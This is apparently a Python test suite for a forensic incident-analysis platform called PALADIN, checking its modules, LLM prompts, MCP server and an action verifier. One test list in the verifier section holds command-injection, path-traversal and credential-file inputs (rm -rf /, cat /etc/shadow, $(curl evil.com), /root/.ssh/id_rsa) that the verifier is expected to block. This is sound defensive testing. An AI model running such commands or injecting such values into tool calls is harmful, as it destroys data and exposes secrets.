"""
PALADIN — Total System Test.
Tests EVERY module across the entire codebase: imports, instantiation,
SAP pipeline, verifier, graph schema, config, forensic layer, prompts.
No external dependencies (Neo4j, Docker, Ollama, Postgres).
"""
import asyncio, sys, os, importlib, inspect
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
os.environ.setdefault("NEO4J_URI", "bolt://localhost:7687")
os.environ.setdefault("NEO4J_PASSWORD", "test")
os.environ.setdefault("POSTGRES_DSN", "postgresql://x:x@localhost/x")

PASS, FAIL = 0, 0

def ok(name):
    global PASS; PASS += 1; print(f"  [PASS] {name}")
def fail(name, e):
    global FAIL; FAIL += 1; print(f"  [FAIL] {name}: {e}")
def section(title):
    print(f"\n{'='*65}\n  {title}\n{'='*65}")

# =====================================================================
section("1. MODULE IMPORTS (all .py files)")
# =====================================================================

modules = [
    "paladin.config.settings",
    "paladin.graph.schema",
    "paladin.graph.neo4j_client",
    "paladin.llm.ollama_client",
    "paladin.llm.prompts",
    "paladin.sap.morpho_parser",
    "paladin.sap.graph_enricher",
    "paladin.sap.correlator",
    "paladin.sap.incident_manager",
    "paladin.sap.auto_executor",
    "paladin.verifier.verifier",
    "paladin.verifier.action_registry",
    "paladin.dashboard.api",
    # Forensic Layer (2.0)
    "paladin.forensic",
    "paladin.forensic.mcp_types",
    "paladin.forensic.action_verifier",
    "paladin.forensic.sandbox_manager",
    "paladin.forensic.mcp_server",
    "paladin.forensic.pg_store",
    "paladin.forensic.prompts",
    "paladin.forensic.plan_manager",
    "paladin.forensic.correlation_engine",
    "paladin.forensic.hallucination_tracker",
]

for mod_name in modules:
    try:
        importlib.import_module(mod_name)
        ok(mod_name)
    except Exception as e:
        fail(mod_name, e)

# =====================================================================
section("2. SETTINGS (PydanticSettings)")
# =====================================================================

from paladin.config.settings import settings

checks = {
    "run_mode exists": hasattr(settings, "run_mode"),
    "ollama_model exists": hasattr(settings, "ollama_model"),
    "neo4j_uri exists": hasattr(settings, "neo4j_uri"),
    "sap_score_threshold > 0": settings.sap_score_threshold > 0,
    "operator_timeout > 0": settings.operator_timeout_seconds > 0,
    # Forensic 2.0
    "severity_pipeline_threshold": hasattr(settings, "severity_pipeline_threshold"),
    "threshold = 0.65": settings.severity_pipeline_threshold == 0.65,
    "sift_sandbox_image": "sift-sandbox" in settings.sift_sandbox_image,
    "max_forensic_iterations = 5": settings.max_forensic_iterations == 5,
    "forensic_enabled = True": settings.forensic_enabled is True,
    "sandbox_cpu_limit > 0": settings.sandbox_cpu_limit > 0,
    "sandbox_memory_limit set": len(settings.sandbox_memory_limit) > 0,
}
for name, result in checks.items():
    ok(name) if result else fail(name, "assertion false")

# =====================================================================
section("3. GRAPH SCHEMA (nodes, rels, constraints, indexes)")
# =====================================================================

from paladin.graph.schema import (
    NodeLabel, RelType, INIT_CONSTRAINTS, INIT_INDEXES)

# Original nodes
orig_nodes = ["EMPLOYEE", "DEVICE", "FILE", "EMAIL", "MESSAGE",
              "CALL", "LOG_EVENT", "IP_ADDRESS", "INCIDENT",
              "DEPARTMENT", "ROLE", "CLEARANCE_LEVEL"]
for n in orig_nodes:
    try:
        NodeLabel[n]; ok(f"NodeLabel.{n}")
    except: fail(f"NodeLabel.{n}", "missing")

# Forensic nodes
for n in ["FORENSIC_PLAN", "TODO_ITEM", "FINDING", "TOOL_EXECUTION"]:
    try:
        NodeLabel[n]; ok(f"NodeLabel.{n} (forensic)")
    except: fail(f"NodeLabel.{n}", "missing")

# Forensic rels
for r in ["HAS_FORENSIC_PLAN", "CONTAINS_TODO", "PRODUCED",
          "PRODUCED_BY", "CONTRADICTS", "HAS_VERSION", "IMPLICATES"]:
    try:
        RelType[r]; ok(f"RelType.{r}")
    except: fail(f"RelType.{r}", "missing")

# Constraints and indexes count
c_count = len(INIT_CONSTRAINTS)
i_count = len(INIT_INDEXES)
ok(f"Constraints: {c_count} (expect >= 12)") if c_count >= 12 else fail("Constraints", c_count)
ok(f"Indexes: {i_count} (expect >= 16)") if i_count >= 16 else fail("Indexes", i_count)

# =====================================================================
section("4. VERIFIER (ActionVerifier — original)")
# =====================================================================

from paladin.verifier.verifier import ActionVerifier
from paladin.verifier.action_registry import ACTIONS

v1 = ActionVerifier()
ok("ActionVerifier instantiated")

# Check action registry
for action_name in ["READ", "NOTIFY", "FLAG", "ISOLATE"]:
    found = action_name in ACTIONS
    ok(f"Action '{action_name}' registered") if found else fail(f"Action '{action_name}'", "missing")

# Test verify_action
result = v1.verify_action(
    proposed_action="NOTIFY", severity="MEDIUM",
    target_entities=["EMP001"], llm_response="Test response for verification")
ok(f"verify_action -> approved={result.action_check.approved}") if result else fail("verify_action", "None")

# =====================================================================
section("5. SAP PIPELINE COMPONENTS")
# =====================================================================

from paladin.sap.morpho_parser import MorphoParser
from paladin.sap.correlator import Correlator, CorrelationResult
from paladin.sap.incident_manager import IncidentManager

parser = MorphoParser()
ok("MorphoParser instantiated")

# Test morpho analysis
try:
    result = parser.analyze("The employee accessed classified documents without authorization")
    ok(f"MorphoParser.analyze -> tokens={len(result.tokens) if hasattr(result,'tokens') else '?'}")
except Exception as e:
    fail("MorphoParser.analyze", e)

# IncidentManager
ok("IncidentManager has set_forensic_plan_manager") if hasattr(IncidentManager, "set_forensic_plan_manager") else fail("IncidentManager", "missing forensic method")

# =====================================================================
section("6. LLM PROMPTS (original)")
# =====================================================================

from paladin.llm.prompts import SYSTEM_PROMPT, build_incident_prompt, parse_llm_response

ok("SYSTEM_PROMPT loaded") if len(SYSTEM_PROMPT) > 50 else fail("SYSTEM_PROMPT", "too short")

# Test prompt building
ctx = {
    "incident_id": "INC-TEST", "title": "Test Incident",
    "severity": "HIGH", "score": 0.85,
    "description": "Suspicious activity detected",
    "involved_employees": ["EMP001"],
    "evidence_summary": "Log entries showing data exfiltration",
}
try:
    prompt = build_incident_prompt(ctx)
    ok(f"build_incident_prompt -> {len(prompt)} chars")
except Exception as e:
    fail("build_incident_prompt", e)

# Test LLM response parsing
test_response = """SUMMARY: Suspicious data exfiltration detected.
ACTION: FLAG
CONFIDENCE: HIGH"""
try:
    parsed = parse_llm_response(test_response)
    ok(f"parse_llm_response -> action={parsed.get('action','?')}")
except Exception as e:
    fail("parse_llm_response", e)

# =====================================================================
section("7. FORENSIC ACTION VERIFIER")
# =====================================================================

from paladin.forensic.action_verifier import (
    ForensicActionVerifier, VerifierCategory, VerifierDecision)

fv = ForensicActionVerifier()

# Safe operations
safe_tests = [
    ("get_file_metadata", {"path": "/evidence/disk.img"}),
    ("compute_hash", {"path": "/evidence/mem.raw", "algorithm": "sha256"}),
    ("analyze_process_list", {"memory_image": "/evidence/mem.raw"}),
    ("scan_network_connections", {"memory_image": "/evidence/mem.raw"}),
    ("parse_mft", {"image_path": "/evidence/disk.img"}),
    ("extract_strings", {"path": "/evidence/malware.exe"}),
    ("extract_registry_hive", {"image_path": "/evidence/SYSTEM"}),
    ("parse_pcap", {"pcap_path": "/evidence/capture.pcap"}),
]
safe_pass = 0
for fn, params in safe_tests:
    r = fv.verify(fn, params)
    if r.category == VerifierCategory.SAFE:
        safe_pass += 1
    else:
        fail(f"SAFE: {fn}", f"got {r.category.value}: {r.reason}")
ok(f"Safe operations: {safe_pass}/{len(safe_tests)}") if safe_pass == len(safe_tests) else None

# Forbidden operations
attacks = [
    ("get_file_metadata", {"path": "/evidence/; rm -rf /"}),
    ("compute_hash", {"path": "/evidence/&& cat /etc/shadow"}),
    ("extract_strings", {"path": "/evidence/$(curl evil.com)"}),
    ("get_file_metadata", {"path": "/evidence/`whoami`"}),
    ("get_file_metadata", {"path": "/evidence/../../../etc/passwd"}),
    ("compute_hash", {"path": "/evidence/..%2F..%2Froot"}),
    ("get_file_metadata", {"path": "/etc/shadow"}),
    ("compute_hash", {"path": "/root/.ssh/id_rsa"}),
    ("delete_file", {"path": "/evidence/x"}),
    ("execute_shell", {"command": "id"}),
    ("chmod", {"path": "/evidence/x", "mode": "777"}),
    ("dd", {"if": "/dev/sda"}),
]
blocked = sum(1 for fn, p in attacks if fv.verify(fn, p).category == VerifierCategory.FORBIDDEN)
ok(f"Attacks blocked: {blocked}/{len(attacks)}") if blocked == len(attacks) else fail("Attacks", f"{blocked}/{len(attacks)}")

# =====================================================================
section("8. MCP SERVER (function registry + rejection)")
# =====================================================================

from paladin.forensic.mcp_server import SIFTMCPServer
from paladin.forensic.sandbox_manager import SandboxManager
from paladin.forensic.mcp_types import MCPRequest, MCPResponse

mcp = SIFTMCPServer(SandboxManager(), fv)
funcs = mcp.get_available_functions()
ok(f"MCP functions registered: {len(funcs)}")

expected_fns = ["get_file_metadata", "compute_hash", "extract_strings",
                "analyze_process_list", "scan_network_connections",
                "extract_loaded_modules", "parse_mft", "parse_prefetch",
                "extract_registry_hive", "parse_pcap", "extract_browser_artifacts"]
missing = [f for f in expected_fns if f not in funcs]
ok(f"All 11 SIFT functions present") if not missing else fail("MCP functions", f"missing: {missing}")

# Test rejection
async def test_mcp_reject():
    # Unknown function
    r = await mcp.execute(MCPRequest(function="hack_the_planet", parameters={}), "x")
    assert not r.success and "Unknown" in r.error
    ok("Unknown function -> rejected")
    # Forbidden path
    r = await mcp.execute(MCPRequest(function="get_file_metadata", parameters={"path": "/etc/passwd"}), "x")
    assert not r.success and "BLOCKED" in r.error
    ok("Forbidden path -> blocked")
asyncio.run(test_mcp_reject())

# =====================================================================
section("9. MCP TYPES (Pydantic models)")
# =====================================================================

from paladin.forensic.mcp_types import (
    FileMetadata, HashResult, ProcessInfo, ProcessList,
    NetworkConnection, ConnectionList, MFTEntry, MFTResult,
    PrefetchEntry, PrefetchResult, RegistryEntry, RegistryResult,
    PCAPResult, DNSQuery, HTTPRequest, BrowserResult,
    StringsList, SuspiciousPattern, ModuleInfo, ModuleList,
    TimelineEvent, SuperTimelineResult, HashAlgorithm, OutputFormat)

model_tests = [
    ("FileMetadata", lambda: FileMetadata(name="x", size=100)),
    ("HashResult", lambda: HashResult(path="/x", algorithm="sha256", hash_value="abc", file_size=1)),
    ("ProcessList", lambda: ProcessList(processes=[ProcessInfo(pid=1, name="init")])),
    ("ConnectionList", lambda: ConnectionList(connections=[
        NetworkConnection(local_addr="1.2.3.4:80", remote_addr="5.6.7.8:443", state="EST")])),
    ("MFTResult", lambda: MFTResult(entry_count=1, timeline=[
        MFTEntry(timestamp="2026-01-01", action="CREATED", path="C:\\x")])),
    ("PrefetchResult", lambda: PrefetchResult(executables=[PrefetchEntry(name="cmd.exe")])),
    ("RegistryResult", lambda: RegistryResult(keys=[RegistryEntry(key_path="HKLM\\Run")])),
    ("PCAPResult", lambda: PCAPResult(dns_queries=[DNSQuery(query="evil.com")])),
    ("BrowserResult", lambda: BrowserResult(history=[{"url": "http://evil.com"}])),
    ("ModuleList", lambda: ModuleList(modules=[ModuleInfo(name="ntdll.dll")])),
    ("SuperTimelineResult", lambda: SuperTimelineResult(events=[
        TimelineEvent(timestamp="2026-01-01", source="mft", event_type="create", description="test")])),
    ("StringsList", lambda: StringsList(strings=["test"], suspicious_patterns=[
        SuspiciousPattern(pattern="1.2.3.4", category="ip")])),
    ("HashAlgorithm enum", lambda: [HashAlgorithm.MD5, HashAlgorithm.SHA256]),
    ("OutputFormat enum", lambda: [OutputFormat.JSON, OutputFormat.CSV, OutputFormat.TIMELINE]),
    ("JSON roundtrip", lambda: MCPResponse.model_validate_json(
        MCPResponse(function="t", success=True, result={"k":"v"}).model_dump_json())),
]
for name, fn in model_tests:
    try: fn(); ok(name)
    except Exception as e: fail(name, e)

# =====================================================================
section("10. FORENSIC PROMPTS")
# =====================================================================

from paladin.forensic.prompts import (
    build_planning_prompt, build_execution_prompt,
    build_self_check_prompt, format_plan_for_prompt)

sp, up = build_planning_prompt("INC-1", "Test", "HIGH", 0.9, "Desc", "/evidence/a\n/evidence/b")
ok("Planning prompt") if "INC-1" in up and "analyze_process_list" in sp else fail("Planning", "content")

se, ue = build_execution_prompt("ctx", 2, "Check MFT", "parse_mft", '{"entries": 100}')
ok("Execution prompt") if "Step 2" in ue else fail("Execution", "step missing")

sc, uc = build_self_check_prompt("F-1", "Found evil", "pslist", 80, "evil.exe",
    [{"finding_id": "F-0", "description": "clean disk", "tool_used": "mft", "confidence": 90}])
ok("Self-check prompt") if "F-1" in uc and "F-0" in uc else fail("Self-check", "content")

plan_text = format_plan_for_prompt({
    "plan_id": "FP-1", "status": "IN_PROGRESS", "iteration_count": 1, "max_iterations": 5,
    "working_plan": "Investigate", "todo_items": [
        {"order_index": 1, "description": "Step 1", "status": "DONE", "result_summary": "Found X"},
        {"order_index": 2, "description": "Step 2", "status": "PENDING"}],
    "findings": [{"finding_id": "F-1", "description": "Evil found", "verified": True, "confidence": 95}]})
ok("Plan format") if "FP-1" in plan_text and "DONE" in plan_text else fail("Plan format", "content")

# Truncation
_, long_usr = build_execution_prompt("c", 1, "s", "t", "x" * 10000)
ok(f"Output truncation ({len(long_usr)} chars)") if "truncated" in long_usr else fail("Truncation", "not truncated")

# =====================================================================
section("11. PLAN MANAGER (JSON parsing)")
# =====================================================================

from paladin.forensic.plan_manager import ForensicPlanManager

cases = [
    ('{"working_plan":"A","todo_items":[]}', "A", 0),
    ('```json\n{"working_plan":"B","todo_items":[{"order":1}]}\n```', "B", 1),
    ('Preamble\n```json\n{"working_plan":"C","todo_items":[]}\n```\nEnd', "C", 0),
    ('```\n{"working_plan":"D","todo_items":[{"o":1},{"o":2}]}\n```', "D", 2),
]
for inp, exp_plan, exp_items in cases:
    r = ForensicPlanManager._parse_json_response(inp)
    match = r.get("working_plan") == exp_plan and len(r.get("todo_items",[])) == exp_items
    ok(f"Parse: plan='{exp_plan}' items={exp_items}") if match else fail("Parse", f"{r}")

r = ForensicPlanManager._parse_json_response("not json")
ok("Graceful fallback") if isinstance(r, dict) else fail("Fallback", "not dict")

# =====================================================================
section("12. CORRELATION ENGINE")
# =====================================================================

from paladin.forensic.correlation_engine import CorrelationEngine

src_map = {"analyze_process_list": "memory", "scan_network_connections": "memory",
           "parse_mft": "disk", "compute_hash": "disk", "extract_strings": "disk",
           "parse_pcap": "network", "extract_browser_artifacts": "network"}
all_src = all(CorrelationEngine._classify_source(t) == e for t, e in src_map.items())
ok(f"Source classification: {len(src_map)} tools") if all_src else fail("Sources", "mismatch")

procs = CorrelationEngine._extract_process_names("Found svchost.exe and cmd.exe running")
ok(f"Process names: {procs}") if "svchost.exe" in procs else fail("Procs", procs)

ips = CorrelationEngine._extract_ips("Connected to 185.141.63.10 and 10.0.0.1")
ok(f"IPs extracted: {ips}") if "185.141.63.10" in ips else fail("IPs", ips)

ok("Private IP: 10.x") if CorrelationEngine._is_private_ip("10.0.0.1") else fail("PrivIP", "10.x")
ok("Public IP: 8.8.8.8") if not CorrelationEngine._is_private_ip("8.8.8.8") else fail("PubIP", "8.8.8.8")

# =====================================================================
section("13. HALLUCINATION TRACKER (structure)")
# =====================================================================

from paladin.forensic.hallucination_tracker import HallucinationTracker
ok("HallucinationTracker importable")
ok("verify_finding method") if hasattr(HallucinationTracker, "verify_finding") else fail("HT", "no verify")
ok("compute_metrics method") if hasattr(HallucinationTracker, "compute_metrics") else fail("HT", "no metrics")
ok("generate_accuracy_report") if hasattr(HallucinationTracker, "generate_accuracy_report") else fail("HT", "no report")

# =====================================================================
section("14. PG STORE (SQL + structure)")
# =====================================================================

from paladin.forensic.pg_store import ForensicPGStore, CREATE_TABLES_SQL

ok("CREATE_TABLES_SQL loaded") if len(CREATE_TABLES_SQL) > 200 else fail("SQL", "too short")
ok("tool_executions table") if "tool_executions" in CREATE_TABLES_SQL else fail("SQL", "no tool_executions")
ok("accuracy_metrics table") if "accuracy_metrics" in CREATE_TABLES_SQL else fail("SQL", "no accuracy_metrics")
ok("verifier_audit_log table") if "verifier_audit_log" in CREATE_TABLES_SQL else fail("SQL", "no audit")

pg = ForensicPGStore()
ok("ForensicPGStore instantiated (no pool)")
ok("log_tool_execution method") if hasattr(pg, "log_tool_execution") else fail("PG", "no log")
ok("export_execution_logs_jsonl") if hasattr(pg, "export_execution_logs_jsonl") else fail("PG", "no export")

# =====================================================================
section("15. SANDBOX MANAGER (structure)")
# =====================================================================

from paladin.forensic.sandbox_manager import SandboxManager

sm = SandboxManager()
ok("SandboxManager instantiated")
ok("create_sandbox method") if hasattr(sm, "create_sandbox") else fail("SM", "no create")
ok("exec_in_sandbox method") if hasattr(sm, "exec_in_sandbox") else fail("SM", "no exec")
ok("destroy_sandbox method") if hasattr(sm, "destroy_sandbox") else fail("SM", "no destroy")
ok("hash_output static") if hasattr(SandboxManager, "hash_output") else fail("SM", "no hash")

h = SandboxManager.hash_output("test output")
ok(f"hash_output -> {h[:16]}...") if len(h) == 64 else fail("hash", f"len={len(h)}")

# =====================================================================
section("16. NEO4J CLIENT (forensic CRUD methods)")
# =====================================================================

from paladin.graph.neo4j_client import Neo4jClient

forensic_methods = [
    "create_forensic_plan", "link_plan_to_incident",
    "create_todo_item", "update_todo_status",
    "create_finding", "get_finding", "update_finding_verification",
    "get_findings_for_plan", "get_plan_with_items",
    "update_plan_status", "increment_plan_iteration",
    "create_plan_version", "add_contradicts_edge",
    "get_contradictions_for_plan", "get_forensic_plan_for_incident",
]
for method in forensic_methods:
    ok(f"Neo4jClient.{method}") if hasattr(Neo4jClient, method) else fail(f"Neo4j.{method}", "missing")

# =====================================================================
section("17. DASHBOARD API (forensic endpoints)")
# =====================================================================

from paladin.dashboard.api import app, init_dashboard
routes = [r.path for r in app.routes]
endpoints = ["/api/forensic/plan/{plan_id}", "/api/forensic/incident/{incident_id}",
             "/api/forensic/accuracy/{plan_id}", "/api/forensic/plan/{plan_id}/approve"]
for ep in endpoints:
    ok(f"Endpoint {ep}") if ep in routes else fail(f"Endpoint {ep}", "not found")

ok("init_dashboard accepts forensic args") if "forensic_plan_mgr" in inspect.signature(init_dashboard).parameters else fail("init_dashboard", "no forensic param")

# =====================================================================
section("18. DOCKER FILES")
# =====================================================================

dockerfile = os.path.join(os.path.dirname(__file__), "..", "docker", "sift-sandbox", "Dockerfile")
if os.path.exists(dockerfile):
    content = open(dockerfile).read()
    ok("Dockerfile exists") 
    ok("sleuthkit in Dockerfile") if "sleuthkit" in content else fail("Dockerfile", "no sleuthkit")
    ok("volatility3 in Dockerfile") if "volatility3" in content else fail("Dockerfile", "no volatility3")
    ok("tshark in Dockerfile") if "tshark" in content else fail("Dockerfile", "no tshark")
    ok("siftuser in Dockerfile") if "siftuser" in content else fail("Dockerfile", "no siftuser")
    ok("sleep infinity in Dockerfile") if "sleep" in content else fail("Dockerfile", "no sleep")
else:
    fail("Dockerfile", "not found")

compose = os.path.join(os.path.dirname(__file__), "..", "docker-compose.paladin.yml")
if os.path.exists(compose):
    content = open(compose).read()
    ok("docker-compose.paladin.yml exists")
    ok("sift-sandbox service") if "sift-sandbox" in content else fail("compose", "no sift-sandbox")
    ok("forensic_evidence volume") if "forensic_evidence" in content else fail("compose", "no evidence vol")
else:
    fail("docker-compose.paladin.yml", "not found")

# =====================================================================
# SUMMARY
# =====================================================================

print(f"\n{'#'*65}")
print(f"  PALADIN TOTAL SYSTEM TEST")
print(f"  Passed: {PASS}  |  Failed: {FAIL}  |  Total: {PASS+FAIL}")
verdict = "ALL SYSTEMS GO" if FAIL == 0 else f"{FAIL} FAILURE(S)"
print(f"  Verdict: {verdict}")
print(f"{'#'*65}")
sys.exit(1 if FAIL else 0)
